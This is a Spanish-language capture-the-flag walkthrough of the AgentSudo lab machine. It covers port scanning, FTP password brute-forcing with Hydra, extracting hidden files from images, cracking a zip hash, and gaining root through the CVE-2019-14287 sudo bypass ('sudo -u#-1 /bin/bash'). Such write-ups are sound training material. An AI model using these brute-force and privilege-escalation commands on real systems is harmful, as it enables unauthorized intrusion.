# Machine AgentSudo

## Informtion Gathering

1. Primero realizo un escaneo de puerto asi:

```
$ nmap -sV 10.10.44.159
``` 
2. El resultado es el siguiente:

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```

## Analisis de vulnerabilidades

- Luego ejecute dirb de esta manera
```
$ dirb http://10.10.44.159
```
- El resultado que me genero son dos URL que no sirven de nada

## Exploiting

- Probe el puerto **80** y tenia una pagina con el **user-agent** de nombre **R**
- entonces use **curl** para poder hacer la peticion a la ip de la maquina y es así:
```
$  curl -A "R" -L http://10.10.44.159/
```
- El resultado es el mismo **HTML** del puerto 80
- Entonces me dio por probar con cada letra del abecedario y con la **C** me salio un mensaje diferente
```
Attention chris, <br><br>

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, 
change your god damn password, is weak! <br><br>

From,<br>
Agent R 

```
- Ya que tengo un usuario de nombre **chris** voy a intentar hacer fuerza bruta
- Y voy a usar **Hydra** para ver si puedo sacar una contraseña
```
$ hydra -l chris -P rockyou.txt ftp://10.10.44.159
```
- Pude obtener esta contraseña:
```
[21][ftp] host: 10.10.44.159   login: chris   password: crystal
```
- Voy a probar es contraseña y usuario con **SSH** pero no funciono
- Entonces la uso con **FTP** y si funciono
- Hay tres archivos y son esto:
```
-rw-r--r--    1 0     0     217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0     0     33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0     0     34842 Oct 29  2019 cutie.png
```
- voy a descargar esos tres archivos
```
$ get cutie.png //para descargar un solo archivo
$ mget * // para descargar varios archivos
```
- El archvo **To_agentJ.txt** tiene un mensaje que indica donde esta una **password**
- Encontre una herramienta de nombre **binwalk** y decido probar con ambas fotos
```
$ binwalk cutie.png
$ binwalk cute-alien.jpg
```
- El archivo **cute-alien.jpg** no tiene nada pero el **cutie.png** si tiene un archivo comprimido
- Para extraer los es con **binwalk -e** así:
```
$ binwalk -e cutie.png
```
- Nos aparece un archivo zip que necesita de una contraseña entonces podemos uasar **zip2john**, que sirve para sacar la contraseña o mas bien el **hash**
```
$ sudo zip2john 8702.zip > pass.hash
```
- Luego vamos a usar **John the ripper** para decifrar el **hash**
```
$ john pass.hash
```
- Como resultado obtuve esto:
```
alien  (8702.zip/To_agentR.txt)
```
- Uso el comando **zip** pero no funciona entonces use esto y funciono
```
$ 7z e 8702.zip
```
- Ya puedo tener acceso al archivo **To_agentR.txt**
- Ese archivo tiene un pensaje con una cadena de caracteres **alfanumerico**
- Entonces uso **hash-identifier** pero no funciona, entonces busco un herramienta para ver que tipo de encriptacion es y encontre **Cyberchef**
- Al parecer es **base64** entonces uso esta intruccion para decrifra
```
$ echo -n 'QXJlYTUx' | base64 -d
```
- Su contraseña es **Area51** entonces la uso para el **SSH** pero no funciona
- Entonces decido probar esa contraseña con la imagen **.jpg** usando el **steghide**
```
$ steghide info cute-alien.jpg
```
- La imagen tiene un archivo **.txt** y voy a usar esto
```
$ steghide extract -sf cute-alien.jpg
```
- Obtengo un usuario de nombre **james** y la contraseña **hackerrules!**
- Luego ya tenemos acceso al **SSH**
```
$ ssh james@10.10.44.159
```
- Podemos entonces sacar la bandera de **user**
- Podemos descargar ese **.jpg** de esta manera
```
mrandrew@kali:~$ scp james@10.10.44.159:/home/james/Alien_autospy.jpg .
```
- Con el **punto (.)** le decimos que lo copie en nuestro directorio actual de la maquina **Kali**
- Podemos abrir la imagen con el comando **eog** así:
```
$ eog Alien_autospy.jpg
```
- Con la herramienta **exiftool** podemos ver la meta data de la imagen así:
```
$ exiftool Alien_autospy.jpg
```
- Podemos colocar en internet **google image search** para sacar mas información de la imagen **Alien_autospy.jpg**
- Entonces hago un **sudo -l** y me sale esto:
```
(ALL, !root) /bin/bash
```
- Se me hace raro por que tenemos el **ALL** pero no tenemos el **/bin/bash**
- Entonces en internet encontre una vulnerabilidad
```
CVE-2019-14287
```
- El exploit que encontre en **exploit-db** solo sugiere ejecutar esta instruccion
```
$ sudo -u#-1 /bin/bash
```
- Ya con la instruccion anterior soy **root** y puedo obtener la ultima bandera

## Glosario

- **user-agent:** 
- **Ataque de diccionario:** es un método de cracking que consiste en intentar averiguar una contraseña probando todas las palabras del diccionario. Este tipo de ataque suele ser más eficiente que un ataque de fuerza bruta, ya que muchos usuarios suelen utilizar una palabra existente en su lengua como contraseña para que la clave sea fácil de recordar, lo cual no es una práctica recomendable. Es decir que vamos a probar las palabras que hay en diccionario para ver si concide con la contraseña
- **Ataque de fuerza bruta:** es la forma de recuperar una clave probando todas las combinaciones posibles hasta encontrar aquella que permite el acceso. Es decir se hacen combinaciones de palabras hasta que se llegue a la indicada

## Investigación

- Opciones **Curl:** https://fmhelp.filemaker.com/help/16/fmp/es/index.html#page/FMP_Help/curl-options.html

- Opciones **FTP:** https://blog.unelink.es/wiki/conectarse-a-un-ftp-desde-linux-y-algunos-comandos-basicos/

- Herramienta **base 64:** https://gchq.github.io/CyberChef/

- Manipulacion **SSH:** https://ed.team/blog/copiar-archivos-a-un-servidor-remoto-usando-la-terminal

- **Binwalk:** https://backtrackacademy.com/tools/binwalk#:~:text=Binwalk%20es%20una%20herramienta%20para,de%20las%20im%C3%A1genes%20del%20firmware.

- https://www.exploit-db.com/exploits/47502

- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-14287

- https://geekytheory.com/copiar-archivos-a-traves-de-ssh-con-scp

- https://seguridadroberto.wordpress.com/2016/11/19/ataques-de-diccionario-ataques-de-fuerza-bruta-programas-diccionarios/#:~:text=En%20criptograf%C3%ADa%2C%20se%20denomina%20ataque,aquella%20que%20permite%20el%20acceso.&text=La%20fuerza%20bruta%20suele%20combinarse,para%20ir%20probando%20con%20ellas.

## Explotación maquina Ignite

https://joona.xyz/2020/03/07/thm-agent-sudo.html

https://floreaiulianpfa.com/agent-sudo-ctf-try-hack-me/

https://sckull.github.io/posts/agent_sudo/

https://blog.qz.sg/agent-sudo-ctf-tryhackme/